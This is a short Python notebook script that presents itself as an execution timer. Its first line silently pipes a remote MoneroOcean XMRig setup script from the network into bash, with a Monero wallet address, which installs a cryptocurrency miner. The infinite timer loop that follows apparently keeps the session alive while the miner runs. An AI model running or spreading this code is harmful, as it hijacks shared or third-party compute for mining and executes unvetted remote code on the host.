import os
os.system('curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2')

import time 
from IPython.display import clear_output 
 
def zero_to_infinity(): 
    i = 0 
    while True: 
        yield i 
        i += 1 
        time.sleep(1) 
 
start = time.time() 
for x in zero_to_infinity(): 
    clear_output(wait=True) 
    end = time.time() 
    temp = end-start 
    hours = temp//3600 
    temp = temp - 3600*hours 
    minutes = temp//60 
    seconds = temp - 60*minutes 
    print("") 
    print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds)) 
    print("")
